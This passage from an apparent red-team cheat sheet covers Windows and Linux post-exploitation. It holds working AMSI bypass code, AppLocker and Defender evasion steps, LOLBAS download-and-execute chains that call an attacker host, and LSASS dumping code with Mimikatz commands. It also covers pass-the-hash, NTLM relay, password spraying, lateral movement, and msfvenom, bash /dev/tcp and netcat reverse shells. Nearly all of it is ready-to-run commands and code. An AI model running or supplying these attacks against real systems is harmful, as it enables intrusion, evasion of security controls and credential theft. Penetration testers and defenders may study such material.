New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" -PropertyType DWORD -Force

5.2.9 Locating & Breaking Signatures

When a payload is flagged, isolate the exact bytes the engine signatures on, then mutate only those bytes so the artifact still runs but no longer matches.

  • Disable heuristic/real-time protection first so only static signatures remain, then scan on-demand.
  • Binary-split the file and rescan progressively smaller chunks until the offending byte range is found.
  • Break the signature by re-ordering code, renaming symbols, or encrypting the flagged bytes — not by changing a single byte (engines tolerate that).
# Split a flagged file and find which byte ranges trigger detection
Find-AVSignature -StartByte 0 -EndByte max -Interval 10000 -Path .\payload.exe -OutPath C:\temp\split

# Modern equivalent: locate the flagged offset against Defender
DefenderCheck.exe payload.exe

# ThreatCheck — bisects the file against Defender/AMSI and prints the bad bytes
ThreatCheck.exe -f payload.exe -e Defender
ThreatCheck.exe -f payload.bin -e AMSI
StageGoalTool
TriageConfirm which engine flags itVirusTotal (private) / antiscan.me
LocateFind the signatured byte rangeFind-AVSignature, DefenderCheck, ThreatCheck
BreakMutate only the flagged bytesencrypt / re-order / rename
VerifyRe-scan offline, never upload to VT publiclocal on-demand scan

5.2.10 Advanced AMSI Bypasses

The Antimalware Scan Interface (AMSI) lets Defender inspect script content (PowerShell, JScript, VBA, .NET) at runtime before execution. Neutralising AMSI in the current process lets subsequent in-memory tooling load cleanly.

  • AMSI is per-process — the bypass only protects the session it runs in, so it must execute before loading flagged tooling.
  • Reflection approaches flip the amsiInitFailed flag so AmsiScanBuffer is never consulted.
  • Memory-patch approaches overwrite the entry of AmsiScanBuffer so it returns clean (AMSI_RESULT_CLEAN) for any input.
  • Static strings like AmsiUtils are themselves signatured — obfuscate/concatenate them.
# Reflection: force amsiInitFailed = true (obfuscate the member strings to avoid the static sig)
$a=[Ref].Assembly.GetType(('System.Management.Automation.'+'Amsi'+'Utils'))
$a.GetField(('amsi'+'InitFailed'),'NonPublic,Static').SetValue($null,$true)

# Split/obfuscated variant to defeat the string signature on the one-liner itself
$x=[Ref].Assembly.GetType("System.Management.Automation.Am"+"siUtils")
$y=$x.GetField("am"+"siInitFailed","NonPublic,Static")
$y.SetValue($null,$true)

# Memory patch: make AmsiScanBuffer return clean via reflected Win32 calls
$w=Add-Type -Name K -Namespace W -PassThru -MemberDefinition '
[DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h,string n);
[DllImport("kernel32")] public static extern IntPtr GetModuleHandle(string n);
[DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a,uint s,uint p,out uint o);'
$addr=$w::GetProcAddress($w::GetModuleHandle('amsi.dll'),'AmsiScanBuffer')
$p=0; $w::VirtualProtect($addr,[uint32]6,0x40,[ref]$p)
$patch=[Byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3)   # mov eax,0x80070057 ; ret
[System.Runtime.InteropServices.Marshal]::Copy($patch,0,$addr,6)

// AMSI bypass in JScript — corrupt the AMSI context before loading .NET tradecraft
var ctx = ... // resolve amsiContext, then zero the session header so scans short-circuit
ApproachMethodNote
ReflectionSet amsiInitFailed=$trueNo Win32 calls; obfuscate strings
Memory patchOverwrite AmsiScanBuffer prologueReturns 0x80070057 (clean)
Hardware breakpointHook AmsiScanBuffer via debug regsNo code patch — evades integrity checks
JScript / VBACorrupt AMSI context pre-loadNeeded for WSH/Office stagers

5.2.11 AppLocker Bypasses

AppLocker only enforces rules against native Windows file types (EXE, MSI, scripts, packaged apps, and optionally DLLs). Default rules whitelist C:\Program Files, C:\Program Files (x86), and C:\Windows recursively, so any user-writable subfolder inside those paths is a bypass.

4.2.11.1 Enumerate AppLocker Policy
# Effective policy and rule collections
Get-AppLockerPolicy -Effective -Xml
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections

# Test whether a specific file would be allowed for a user
Get-ChildItem C:\Windows\Tasks\*.exe | Convert-Path | Test-AppLockerPolicy -PolicyObject (Get-AppLockerPolicy -Effective) -User [domain]\[user]

# Confirm the current session's language mode (ConstrainedLanguage => AppLocker script rules active)
$ExecutionContext.SessionState.LanguageMode
4.2.11.2 Writable Whitelisted Folders

Find a folder under a whitelisted path that grants both write and execute to the current user, then drop and run the payload there.

# AccessChk: -w writable, -u suppress errors, -s recurse
accesschk.exe -wus "[user]" C:\Windows

# Confirm the folder is also executable (look for the (RX) flag for Authenticated Users)
icacls.exe C:\Windows\Tasks

# Common default writable+executable folders
copy payload.exe C:\Windows\Tasks\payload.exe && C:\Windows\Tasks\payload.exe
  • C:\Windows\Tasks and C:\Windows\Temp are writable+executable for standard users by default.
  • C:\Windows\System32\spool\drivers\color and C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys are frequently usable too.
4.2.11.3 Unmanaged DLL Loading

Default rulesets do not include the DLL rule collection, so loading an arbitrary unmanaged DLL with an exported function is unrestricted.

rundll32.exe C:\Users\[user]\payload.dll,run

# Generate a loadable Meterpreter DLL
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=[attacker-ip] LPORT=[port] -f dll -o payload.dll
4.2.11.4 Alternate Data Streams

Write script content into an ADS of a writable+executable file in a trusted location, then execute the stream directly. Bypasses AppLocker script rules.

# Hide JScript in an ADS of a trusted, writable log file
type test.js > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"

# Verify the stream exists
dir /r "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log"

# Execute the stream, not the primary file
wscript "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"
4.2.11.5 Third-Party Scripting Engines

AppLocker does not cover non-native engines (Python, Perl, Java) or VBA inside Office documents saved outside whitelisted folders.

# Any installed third-party interpreter bypasses script rules outright
python payload.py
java -jar payload.jar
4.2.11.6 PowerShell CLM Escape via Custom Runspace

When AppLocker forces ConstrainedLanguage on powershell.exe, a custom C# runspace built from System.Management.Automation.dll runs in FullLanguage and is not subject to that restriction. This also survives a deny rule on powershell.exe.

using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            // Runs in FullLanguage even when powershell.exe is in ConstrainedLanguage
            string cmd = "(New-Object System.Net.WebClient).DownloadString('http://[attacker-ip]/PowerUp.ps1') | IEX; Invoke-AllChecks | Out-File -FilePath C:\\Tools\\out.txt";

            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            ps.AddScript(cmd);
            ps.Invoke();

            rs.Close();
        }
    }
}

# Reference the GAC assembly when compiling
# C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll
# Then run from a whitelisted folder
copy Bypass.exe C:\Windows\Tasks\ && C:\Windows\Tasks\Bypass.exe
4.2.11.7 InstallUtil (Managed-Code LOLBAS)

Put the runspace/shellcode logic inside an installer class's Uninstall method, then trigger it with the trusted InstallUtil.exe so AppLocker's executable rules never apply. Main must exist but is only a decoy.

using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("This is the main method which is a decoy");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            string cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Tools\\out.txt";
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }
    }
}

# /U triggers Uninstall(); /logfile= and /LogToConsole=false suppress output
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Tools\Bypass.exe
4.2.11.8 LOLBAS Download/Decode/Execute Chain

The InstallUtil binary must be on disk; stage it with native, whitelisted tools to also dodge AV on the wire and at rest.

# Encode the assembly on the dev box, host file.txt on the web server
certutil -encode Bypass.exe file.txt

# Download + decode + execute via native binaries (chained with &&)
bitsadmin /Transfer myJob http://[attacker-ip]/file.txt C:\Users\[user]\enc.txt && certutil -decode C:\Users\[user]\enc.txt C:\Users\[user]\Bypass.exe && del C:\Users\[user]\enc.txt && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Users\[user]\Bypass.exe
4.2.11.9 Microsoft.Workflow.Compiler

The signed Microsoft.Workflow.Compiler.exe compiles and loads arbitrary C# from disk. Any class inheriting Activity has its constructor instantiated, giving code execution. It takes two args: a serialized XML input file and a (discarded) output file.

using System;
using System.Workflow.ComponentModel;

public class Run : Activity
{
    public Run()
    {
        Console.WriteLine("I executed!");
        // Place shellcode runner / runspace code here
    }
}

# Generate the correctly-serialized run.xml that points at the C# file
$workflowexe = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe"
$workflowasm = [Reflection.Assembly]::LoadFrom($workflowexe)
$SerializeInputToWrapper = [Microsoft.Workflow.Compiler.CompilerWrapper].GetMethod('SerializeInputToWrapper',[Reflection.BindingFlags]'NonPublic, Static')
Add-Type -Path 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Workflow.ComponentModel.dll'
$compilerparam = New-Object -TypeName Workflow.ComponentModel.Compiler.WorkflowCompilerParameters
$compilerparam.GenerateInMemory = $True
$pathvar = "run.cs"     # file containing the Activity C# code
$output  = "C:\Tools\run.xml"
$tmp = $SerializeInputToWrapper.Invoke($null, @([Workflow.ComponentModel.Compiler.WorkflowCompilerParameters]$compilerparam, [String[]]@(,$pathvar)))
Move-Item $tmp $output

# Trigger compile + execute (second arg is a throwaway results file)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe run.xml results.xml
4.2.11.10 MSBuild Inline Task

MSBuild compiles and runs C# embedded in a project file, executing fully in memory without writing a PE to disk.

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.csproj
4.2.11.11 JScript: MSHTA and XSL Transform

Both mshta.exe and the WMIC XSL transform (Squiblytwo) are signed, whitelisted binaries that execute embedded JScript, reviving DotNetToJScript / SharpShooter tradecraft.

# MSHTA: deliver an .hta (e.g. via a shortcut pointing at it)
mshta.exe http://[attacker-ip]/payload.hta

<html><head><script language="JScript">
var shell = new ActiveXObject("WScript.Shell");
shell.Run("cmd.exe");
</script></head><body><script language="JScript">self.close();</script></body></html>

<?xml version='1.0'?>
<stylesheet version="1.0" xmlns="http://www.w3.org/1999/XSL/Transform"
  xmlns:ms="urn:schemas-microsoft-com:xslt"
  xmlns:user="http://mycompany.com/mynamespace">
  <output method="text"/>
  <ms:script implements-prefix="user" language="JScript">
    <![CDATA[
      var r = new ActiveXObject("WScript.Shell");
      r.Run("cmd.exe");
    ]]>
  </ms:script>
</stylesheet>

# Squiblytwo: WMIC triggers the remote XSL transform
wmic process get brief /format:"http://[attacker-ip]/payload.xsl"
4.2.11.12 LOLBAS Bypass Reference
Binary Technique Command
InstallUtil.exe Run code in installer Uninstall method InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe
MSBuild.exe Inline C# task compiled in-memory MSBuild.exe payload.csproj
Microsoft.Workflow.Compiler.exe Compile+run C# via Activity constructor Microsoft.Workflow.Compiler.exe run.xml results.xml
regsvr32.exe Squiblydoo: scriptlet via COM registration regsvr32 /s /n /u /i:http://[attacker-ip]/payload.sct scrobj.dll
rundll32.exe Load unmanaged DLL export rundll32.exe payload.dll,run
mshta.exe Execute JScript/VBScript in an HTA mshta.exe http://[attacker-ip]/payload.hta
wmic.exe Squiblytwo: remote XSL transform wmic process get brief /format:"http://[attacker-ip]/payload.xsl"
certutil.exe / bitsadmin.exe Native download + base64 decode staging bitsadmin /Transfer j http://[attacker-ip]/f.txt enc.txt && certutil -decode enc.txt p.exe

LOLBAS Project

5.2.12 Network Filter Evasion

The Internet-edge stack inspects egress traffic via DNS filters, web proxies, IDS/IPS, and HTTPS inspection. The goal is to normalize C2 traffic so it blends into legitimate noise. Always connect to listeners by domain name, not raw IP.

4.2.12.1 DNS Filters

DNS filters block by reputation blocklist, "newly seen domain" heuristics, and category. Prepare domains well in advance so they accrue traffic and a benign category.

  • Avoid brand-new domains (flagged as Newly Seen Domain); register and generate lookups/traffic weeks before the engagement.
  • Host benign content (e.g. a cooking blog) and submit/vote for a safe category via OpenDNS Domain Tagging so it isn't classed as webmail/malware.
  • Use legitimate-sounding names; typo-squatting (e.g. examp1e.com) lowers NLP suspicion but can itself trigger alerts.
# Compare a sinkholing resolver against a clean one to detect DNS filtering
nslookup www.internetbadguys.com 8.8.8.8            # public IP if unfiltered
nslookup www.internetbadguys.com 208.67.222.222     # sinkhole IP if filtered (OpenDNS)

# Check domain/IP reputation and category before the engagement
# https://www.ipvoid.com/dns-reputation/
# https://www.virustotal.com/
# https://community.opendns.com/domaintagging/search/
4.2.12.2 Web Proxies

Web proxies MITM HTTP(S), filtering by URL/category and logging Host, User-Agent, Referer, method, and path. The payload must be proxy-aware and conform to HTTP standards.

# Use a proxy-aware HTTP(S) payload (Meterpreter uses InternetSetOptionA / HttpOpenRequestA)
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=[domain] LPORT=443 -f exe -o payload.exe

# Match a User-Agent the org actually allows (e.g. Edge on Windows)
# In multi/handler:
set HttpUserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
  • Categorize the C2 domain (uncategorized domains get flagged): check via Symantec SiteReview / Check Point URLCat.
  • Front the C2 behind a CDN/cloud domain (cloudfront.net, azurewebsites.net, wordpress.com) that is commonly auto-allowed.
4.2.12.3 IDS/IPS Signatures

IDS/IPS reassemble traffic and match deep-packet signatures. Tiny, unique deviations in a framework's traffic (Meterpreter URI pattern, Cobalt Strike's extra space after the HTTP specifier) get signatured, so altering the traffic pattern bypasses them.

# Replace Meterpreter's randomized self-signed cert (Norton/Symantec signatures it)
openssl req -new -x509 -nodes -out cert.crt -keyout priv.key
# Provide sane field data (Country/Org/CN matching a benign domain)
cat priv.key cert.crt > custom.pem

# /etc/ssl/openssl.cnf: relax SECLEVEL so the handler's TLS works
# CipherString=DEFAULT@SECLEVEL=2  ->  CipherString=DEFAULT

# Use the custom cert in the handler
# set HandlerSSLCert /home/kali/custom.pem
# Alternative: generate a cert matching a real site
# use auxiliary/gather/impersonate_ssl
4.2.12.4 HTTPS Inspection

HTTPS inspection re-signs traffic with the org CA, so there is no clean bypass; minimize profile and consider aborting on inspection.

  • TLS certificate pinning in Meterpreter (set StagerVerifySSLCert true + HandlerSSLCert) makes the payload self-terminate on a cert mismatch.
  • Categorize the C2 domain into a class typically exempt from inspection (e.g. banking) to avoid decryption.

5.2.13 Microsoft Defender — Enumeration & Tampering

Before deploying tooling, fingerprint Defender's exact state — real-time protection, tamper protection, and configured exclusions decide what runs cleanly.

4.2.13.1 Enumerating Defender
# Overall engine + signature state (AMServiceEnabled, RealTimeProtectionEnabled, IsTamperProtected)
Get-MpComputerStatus

# Full configuration: exclusions, disabled features, ASR rules, threat defaults
Get-MpPreference
# Just the exclusions (often a free path to drop payloads)
Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
Get-MpPreference | Select-Object ExclusionProcess, ExclusionExtension

# Detection history
Get-MpThreat
Get-MpThreatDetection

REM CLI engine wrapper (works without the PowerShell module)
"%ProgramFiles%\Windows Defender\MpCmdRun.exe" -GetFiles
MpCmdRun.exe -Scan -ScanType 3 -File C:\path\payload.exe
4.2.13.2 Tampering (requires admin)

Tamper Protection blocks most of these from script — confirm IsTamperProtected is False first. Prefer narrow exclusions over fully disabling protection.

# Carve out an exclusion so payloads in a known path/process/ext are ignored
Add-MpPreference -ExclusionPath "C:\Windows\Tasks"
Add-MpPreference -ExclusionProcess "powershell.exe"
Add-MpPreference -ExclusionExtension "exe"

# Disable individual engines (real-time, behavior, script, IOAV, on-access)
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -MAPSReporting 0 -SubmitSamplesConsent 2   # kill cloud/sample submission

REM Remove signatures so the engine has nothing to match (loud, but effective pre-op)
"%ProgramFiles%\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
4.2.13.3 Static Signature Evasion

Defender's on-disk scan matches byte signatures. Locate the flagged bytes (see 4.2.9), then encrypt them so the artifact no longer matches but still self-decrypts at runtime.

  • Split-and-rescan to isolate the exact signatured bytes, then mutate only those.
  • XOR is enough to break a static signature; AES adds resistance to trivial brute-force/entropy heuristics.
  • Keep the decryption stub small and avoid known-bad API call patterns that trip behavioral detection.
# Generate raw shellcode, then encrypt it offline before embedding in a loader
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=[attacker-ip] LPORT=443 -f raw -o sc.bin
python3 -c "k=0xAA;d=open('sc.bin','rb').read();open('sc.enc','wb').write(bytes(b^k for b in d))"
4.2.13.4 Dynamic Analysis Evasion

Defender also detonates samples in an emulator/sandbox before allowing execution. Stall or fingerprint that environment so the malicious path is never reached during emulation.

  • Delay execution past the emulator timeout (large benign loops, Sleep with timing checks, API calls the emulator stubs).
  • Fingerprint the sandbox: low core/RAM counts, missing user activity, known emulator artifacts (computerName, fake usernames).
  • Gate the payload behind a runtime check that only passes on the real target (domain join, specific username/host).

4.3.1.3 Command One-Liners

Useful for Evil-WinRM and unstable shells where interactive Mimikatz is impractical.

.\mimikatz.exe "privilege::debug" "[command]" "exit"

# Save output to file (survives shell disconnect)
mimikatz.exe "privilege::debug" "[command]" "exit" > C:\temp\mimikatz_output.txt

# Suppress output
mimikatz.exe "privilege::debug" "[command]" "exit" > nul 2>&1

# Encode command for -enc execution
$command = "privilege::debug [command] exit"
$encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))
powershell -enc <encodedCommand>

# Remote execution via PsExec
impacket-psexec [DOMAIN]/[user]:[password]@[ip] "C:\\Windows\\System32\\mimikatz.exe 'privilege::debug' 'sekurlsa::logonPasswords' 'exit'"

# Remote execution via WMIExec
impacket-wmiexec [DOMAIN]/[user]:[password]@[ip] "C:\\Windows\\System32\\mimikatz.exe 'privilege::debug' 'sekurlsa::logonPasswords' 'exit'"

# Download and execute
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('http://[attacker_ip]/mimikatz.exe', 'C:\\temp\\mimikatz.exe')"
powershell -Command "C:\\temp\\mimikatz.exe 'privilege::debug' '[command]' 'exit'"
4.3.1.4 LSA Protection Bypass

Since Windows 8, LSASS can run as Protected Process Light (PPL) — controlled by HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL = 1. Mimikatz ships mimidrv.sys (a signed kernel driver) to remove PPL at the kernel level. Requires Admin/SYSTEM + SeLoadDriverPrivilege.

# Check if LSA Protection is enabled (1 = enabled)
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL

# Load mimidrv.sys kernel driver
mimikatz # !+

# Remove PPL protection from LSASS
mimikatz # !processprotect /process:lsass.exe /remove

# Dump credentials
mimikatz # sekurlsa::logonpasswords
4.3.1.5 MiniDump

Dump LSASS memory offline using the MiniDump tool (or Task Manager on a GUI host), then parse with Mimikatz.

MiniDump.exe

# Parse the dump offline (no LSASS interaction needed)
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords

5.3.2 Cracking Hashes

4.3.2.1 NTLM
# Dump local NTLM hashes
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::sam

# Crack NTLM hash (mode 1000); rule is optional
hashcat -m 1000 <NTLM_HASH> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

# If uncrackable, use Pass-the-Hash
impacket-smbclient -hashes <LM_HASH>:<NTLM_HASH> [user]@[target_ip]
4.3.2.2 Net-NTLMv2
# Capture Net-NTLMv2 challenge/response hashes
sudo responder -I <interface>

# Crack captured hash (mode 5600)
hashcat -m 5600 <hash_file> /usr/share/wordlists/rockyou.txt --force

5.3.3 Pass-The-Hash

# Dump SAM to obtain NTLM hash
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::sam

# Authenticate with hash (no plaintext password needed)
impacket-psexec -hashes <LM_HASH>:<NTLM_HASH> [user]@[target_ip]

impacket-wmiexec -hashes <LM_HASH>:<NTLM_HASH> [user]@[target_ip]

xfreerdp /v:[target_ip] /u:[user] /pth:<NTLM_HASH>

5.3.4 Relay Attacks

  • Relay captured NTLMv2 authentication to a target instead of cracking it.
  • Prerequisite: SMB signing disabled on the target; attacker is on the same network segment.
  • Trigger victim to connect to attacker (e.g., via RCE, SCF/LNK file, or Responder coerce).
# Start relay — execute reverse shell on target upon relay success
impacket-ntlmrelayx --no-http-server -smb2support -t [target_ip] -c "powershell -enc <base64_payload>"

# Catch the reverse shell
nc -nvlp [port]

# Trigger victim to authenticate to attacker (example via RCE)
dir \\[attacker_ip]\test

5.3.5 Spray Credentials

4.3.5.1 Hydra
# RDP password spray
hydra -L [users].txt -p "[password]" rdp://[target_ip]
4.3.5.2 NetExec
# SMB
netexec smb [targets].txt -u [users].txt -p [passwords].txt -d [domain] --continue-on-success

# WinRM (hash or password)
netexec winrm [targets].txt -u [users].txt -H [hashes].txt
netexec winrm [targets].txt -u [users].txt -H [hashes].txt -d [domain].com --continue-on-success

# RDP
netexec rdp [targets].txt -u [users].txt -p [passwords].txt --continue-on-success

# FTP
netexec ftp [targets].txt -u [users].txt -p [passwords].txt -d [domain] --continue-on-success

# SSH (password)
netexec ssh [targets].txt -u [users].txt -p [passwords].txt --continue-on-success
# SSH with domain users: list must contain user@domain.com format

# SSH (private key)
netexec ssh [targets].txt -u [users].txt -p "" --key-file [private_key]

# SMTP
netexec smtp [targets].txt -u [users].txt -p [passwords].txt --continue-on-success

# POP3
netexec pop3 [targets].txt -u [users].txt -p [passwords].txt --continue-on-success

5.3.6 Access Token Manipulation

  • An access token records a user's authorization (SID, integrity level, privileges). A primary token drives a process; an impersonation token lets a thread act as another user.
  • Impersonation levels: Anonymous / Identification (enumeration only), Impersonation (act as the client), Delegation (chain auth across machines).
  • With a delegation token for a user already on the box you can act and authenticate to remote hosts as them — no password or hash required, and nothing is written to disk.
# List privileges in the current token (look for SeImpersonate / SeAssignPrimaryToken)
whoami /priv

Meterpreter Incognito — steal and reuse logged-on user tokens.

meterpreter > load incognito

# List available tokens by unique user
meterpreter > list_tokens -u

# Impersonate a delegation token (acts as that user, incl. remote auth)
meterpreter > impersonate_token [domain]\\[user]

meterpreter > getuid

Mimikatz token operations.

# List tokens, then impersonate one by index
mimikatz # token::list
mimikatz # token::elevate            # grab a SYSTEM token
mimikatz # token::elevate /domainadmin   # find & impersonate a domain-admin token
mimikatz # token::revert             # drop back to the original token

Rubeus — pass-the-ticket into the current logon session (token reuse via Kerberos).

# Inject a .kirbi TGT/TGS into memory, then reuse it
Rubeus.exe ptt /ticket:[ticket].kirbi

# Dump tickets currently in memory for reuse
Rubeus.exe triage
Rubeus.exe dump /nowrap
4.3.6.1 Processing Credentials Offline

Dump LSASS on the target, then parse the dump on a separate matching-OS/arch host so Mimikatz never runs on the victim.

# Command-line LSASS dump with ProcDump (SysInternals)
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Native, tool-less dump: comsvcs.dll MiniDump (run elevated; [pid] = lsass PID)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump [pid] C:\Windows\Tasks\lsass.dmp full

// MiniDump.exe — custom MiniDumpWriteDump of LSASS (run elevated)
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

namespace MiniDump
{
    class Program
    {
        [DllImport("Dbghelp.dll")]
        static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId, IntPtr hFile,
            int DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);

        [DllImport("kernel32.dll")]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        static void Main(string[] args)
        {
            FileStream dumpFile = new FileStream("C:\\Windows\\Tasks\\lsass.dmp", FileMode.Create);
            Process[] lsass = Process.GetProcessesByName("lsass");
            int lsass_pid = lsass[0].Id;
            IntPtr handle = OpenProcess(0x001F0FFF, false, lsass_pid);
            // DumpType 2 = MiniDumpWithFullMemory
            MiniDumpWriteDump(handle, lsass_pid, dumpFile.SafeFileHandle.DangerousGetHandle(),
                2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
        }
    }
}

# Parse the dump offline (no elevation / SeDebugPrivilege needed to read a dump)
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords

# Or parse on Linux with pypykatz
pypykatz lsa minidump lsass.dmp

5.3.7 Windows Lateral Movement

Most Windows lateral movement reuses an NTLM hash or Kerberos ticket and needs local-admin on the target. The table summarizes the common methods.

Method Tool Port(s) Auth
RDP (GUI/console)mstsc.exe / xfreerdp / SharpRDP3389/TCPCleartext; hash via restricted-admin (PtH)
PsExec (SMB service)psexec / impacket-psexec445/TCPCleartext or PtH
WMIimpacket-wmiexec / wmic135/TCP + 49152+Cleartext or PtH
WinRM / PSRemotingevil-winrm / Enter-PSSession5985/5986/TCPCleartext or PtH
DCOMimpacket-dcomexec / MMC20135/TCP + 49152+Cleartext or PtH
Remote service (SCM)sc.exe / SCShell445/TCPCleartext or PtH
Scheduled taskimpacket-atexec / schtasks445/TCPCleartext or PtH
4.3.7.1 RDP & RDP Hijacking

RDP blends into normal admin traffic. The native client takes cleartext only; restricted-admin mode enables pass-the-hash and avoids caching creds on the target.

# Connect from Kali with a password
xfreerdp /u:[user] /d:[domain] /p:[password] /v:[ip] /cert-ignore

# Pass-the-hash (target needs restricted admin mode enabled)
xfreerdp /u:[user] /d:[domain] /pth:[hash] /v:[ip] /cert-ignore

# Native client; /restrictedadmin uses the current session (no password prompt)
mstsc.exe /restrictedadmin

# Mimikatz PtH -> launch mstsc as the target user with restricted admin
mimikatz # privilege::debug
mimikatz # sekurlsa::pth /user:[user] /domain:[domain] /ntlm:[hash] /run:"mstsc.exe /restrictedadmin"

# Enable restricted admin mode on the target (0 = enabled)
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0

# SharpRDP — command execution over RDP, no GUI / tunnel needed
SharpRDP.exe computername=[host] username=[domain]\[user] password=[password] command="powershell (New-Object System.Net.WebClient).DownloadFile('http://[attacker-ip]/met.exe','C:\Windows\Tasks\met.exe');C:\Windows\Tasks\met.exe"

RDP session hijacking — take over a disconnected session as SYSTEM without its password. tscon attaches the target session to your console; run it from a SYSTEM service so no credentials are required.

# Enumerate sessions (note the target session ID and state)
query user
quser

# As SYSTEM: redirect a target session to the current console (no password)
tscon [session_id] /dest:console

# Get SYSTEM by abusing a service to run tscon
sc.exe create sesshijack binpath= "cmd.exe /k tscon [session_id] /dest:console"
sc.exe start sesshijack
4.3.7.2 Fileless Lateral Movement

impacket *exec tools — all accept cleartext or -hashes [lm]:[nt] for pass-the-hash.

# PsExec — SMB + creates/runs a service (writes a binary, drops a service)
impacket-psexec [domain]/[user]@[ip]
impacket-psexec -hashes :[hash] [domain]/[user]@[ip]

# WMI — DCOM over 135; no new service, semi-interactive shell
impacket-wmiexec [domain]/[user]@[ip]
impacket-wmiexec -hashes :[hash] [domain]/[user]@[ip]

# DCOM (MMC20.Application / ShellWindows)
impacket-dcomexec [domain]/[user]@[ip]

# Scheduled task over SMB
impacket-atexec [domain]/[user]@[ip] "whoami"

# WinRM from Kali (password or hash)
evil-winrm -i [ip] -u [user] -p [password]
evil-winrm -i [ip] -u [user] -H [hash]

# PSRemoting from Windows (WinRM 5985/5986)
Enter-PSSession -ComputerName [host]
Invoke-Command -ComputerName [host] -ScriptBlock { whoami }

# WMI from Windows
wmic /node:[host] /user:[domain]\[user] /password:[password] process call create "cmd.exe /c [command]"
Invoke-WmiMethod -ComputerName [host] -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c [command]"

# Remote service via sc.exe (creates a service, runs as SYSTEM)
sc.exe \\[host] create [svc] binpath= "C:\Windows\Tasks\met.exe"
sc.exe \\[host] start [svc]

# Remote scheduled task / at
schtasks /create /s [host] /tn [task] /tr "C:\Windows\Tasks\met.exe" /sc once /st 00:00 /ru SYSTEM
schtasks /run /s [host] /tn [task]

SCShell — PsExec-style execution that creates no new service and writes no file: it reconfigures an existing service's binary (e.g. SensorService) via ChangeServiceConfig, starts it, then restores the original. Easy to pass-the-hash.

# scshell.py — code execution using only the NTLM hash, restores the service after
scshell.py -hashes :[hash] [domain]/[user]@[ip] SensorService

6. Linux Post Exploitation

6.1 Initial Access

6.1.1 Meterpreter

msfvenom -p linux/x64/shell_reverse_tcp LHOST=[ip] LPORT=[port] -f elf -o shell.elf
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=[ip] LPORT=[port] -f elf -o shell.elf

sudo msfconsole -q -x "use multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set lhost [ip]; set lport [port]; exploit"

chmod +x ./shell.elf
./shell.elf

6.1.2 Reverse Shells

nc -nvlp [port]

/bin/bash -i >& /dev/tcp/[ip]/[port] 0>&1

echo '/bin/bash -i >& /dev/tcp/[ip]/[port] 0>&1' >> shell.sh
./shell.sh

# FIFO/netcat
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [ip] [port] >/tmp/f

